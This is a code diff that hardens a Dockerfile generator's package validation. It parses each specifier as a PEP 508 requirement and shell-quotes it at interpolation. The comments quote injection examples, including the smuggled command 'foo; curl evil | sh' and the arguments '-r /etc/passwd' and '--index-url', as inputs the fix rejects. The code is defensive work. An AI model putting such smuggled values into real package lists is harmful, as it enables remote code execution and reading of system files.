@@ -11,6 +11,7 @@ from __future__ import annotations
 import io
 import logging
 import re
+import shlex
 import tarfile
 import threading
 import weakref
@@ -45,36 +46,69 @@ def _image_build_lock(tag: str) -> threading.Lock:
 IMAGE_SCHEMA_VERSION = "v3"
 
 # RD-2: ``ensure_docker_image`` interpolates the env's package list and Python
-# version straight into a shell ``RUN uv pip install`` / ``FROM python:`` line in
-# the generated Dockerfile. Shell metacharacters in a package name (e.g.
-# ``"foo; curl evil | sh"``) would otherwise execute at build time. The env is
-# admin-controlled (``environment:write``), but we validate as defence-in-depth.
-# Each requirement is restricted to a PEP 508 name + optional extras + optional
-# version specifiers using only characters that cannot break out of the shell
-# word (no spaces, quotes, ``;``, ``|``, ``&``, ``$``, ``()``, backticks, …).
-_PKG_SPEC_RE = re.compile(
-    r"^[A-Za-z0-9][A-Za-z0-9._-]*"                      # distribution name
-    r"(\[[A-Za-z0-9._,-]+\])?"                          # optional extras
-    r"((===|==|!=|<=|>=|~=|<|>)[A-Za-z0-9._-]+"         # first version specifier
-    r"(,(===|==|!=|<=|>=|~=|<|>)[A-Za-z0-9._-]+)*)?$"   # further specifiers
-)
+# version into a shell ``RUN uv pip install`` / ``FROM python:`` line in the
+# generated Dockerfile, so ``"foo; curl evil | sh"`` would otherwise execute at
+# build time. The env is admin-controlled (``environment:write``), but this is
+# validated as defence-in-depth. Two layers do it: every requirement must parse
+# as a real PEP 508 requirement, and every one is shell-quoted at interpolation.
 _PY_VERSION_RE = re.compile(r"^[0-9]+(\.[0-9]+){0,2}$")
+
+# Characters that can end a shell word or start a new command. Markers
+# legitimately contain spaces, quotes, ``;`` and comparison operators, so the
+# specifier is shell-quoted at interpolation time (``_install_command``) rather
+# than restricted to a metacharacter-free subset. These few have no place in
+# any PEP 508 requirement and would survive quoting as line breaks.
+_FORBIDDEN_IN_SPEC = ("\n", "\r", "\x00")
 
 
 def _validate_packages(packages: list[str]) -> list[str]:
-    """Return the validated package specifiers or raise ``ValueError`` (RD-2)."""
+    """Return the validated package specifiers or raise ``ValueError`` (RD-2).
+
+    Validation is delegated to ``packaging.requirements.Requirement`` — the same
+    parser pip and uv use — rather than a hand-rolled regex. The regex rejected
+    every specifier carrying a PEP 508 environment marker, which two shipped
+    node requirements use (``zxing-cpp>=2.2; sys_platform=='win32'`` and
+    ``audioop-lts>=0.2; python_version>='3.13'``). Package preflight tells the
+    user to add those exact strings to their environment, so following the
+    product's own advice made the sandbox image build fail (F-12).
+
+    Parsing also closes the injection door more tightly than the regex did:
+    ``--index-url=...`` and ``-r /etc/passwd`` are not requirements at all and
+    are now rejected, where a pattern match on the leading name could be
+    coaxed past.
+    """
+    from packaging.requirements import InvalidRequirement, Requirement
+
     safe: list[str] = []
     for raw in packages:
         spec = str(raw).strip()
         if not spec:
             continue
-        if not _PKG_SPEC_RE.match(spec):
+        if any(bad in spec for bad in _FORBIDDEN_IN_SPEC):
             raise ValueError(
-                f"invalid package specifier {spec!r}: only PEP 508 name/extras/"
-                "version specifiers are allowed (no shell metacharacters)"
+                f"invalid package specifier {spec!r}: control characters are not allowed"
             )
+        try:
+            Requirement(spec)
+        except InvalidRequirement as exc:
+            raise ValueError(
+                f"invalid package specifier {spec!r}: expected a PEP 508 "
+                f"requirement (name, optional extras, version specifiers and "
+                f"an optional environment marker) — {exc}"
+            ) from exc
         safe.append(spec)
     return safe
+
+
+def _install_command(packages: list[str]) -> str:
+    """The ``uv pip install`` line for a generated Dockerfile.
+
+    Every specifier is shell-quoted: an environment marker contains spaces,
+    quotes and comparison operators, so interpolating it raw would split one
+    requirement into several shell words and install the wrong thing.
+    """
+    quoted = " ".join(shlex.quote(spec) for spec in packages)
+    return f"RUN uv pip install --system {quoted}"
 
 
 def _validate_python_version(version: str) -> str:
@@ -373,7 +407,7 @@ def ensure_docker_image(client: Any, image_tag: str, env_payload: dict) -> None:
         if packages:
             dockerfile += (
                 "USER root\n"
-                f"RUN uv pip install --system {' '.join(packages)}\n"
+                f"{_install_command(packages)}\n"
                 "USER nodyra\n"
             )
 
